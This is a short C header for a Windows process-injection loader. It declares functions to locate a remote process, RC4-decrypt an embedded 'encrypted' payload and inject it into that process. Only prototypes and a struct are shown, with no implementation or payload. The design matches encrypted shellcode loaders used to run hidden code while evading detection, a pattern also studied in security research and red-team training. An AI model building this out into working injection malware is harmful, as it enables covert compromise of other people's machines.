#ifndef INJECTION
#define INJECTION

#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include <TlHelp32.h>
#include <winternl.h>

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size);
BOOL getRemoteProcHandle(char* procName, DWORD* procPID, HANDLE* procHand);
BOOL processInjection(PVOID decrypted, size_t payloadSize, HANDLE remoteProcHand);


typedef struct {
    unsigned int i;
    unsigned int j;
    unsigned char s[256];
} Rc4Context;

extern unsigned char encrypted[];

int rc4Init(Rc4Context* context, const unsigned char* key, size_t length);
void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length);
size_t decryptPay(unsigned char* decryptPayload);



#endif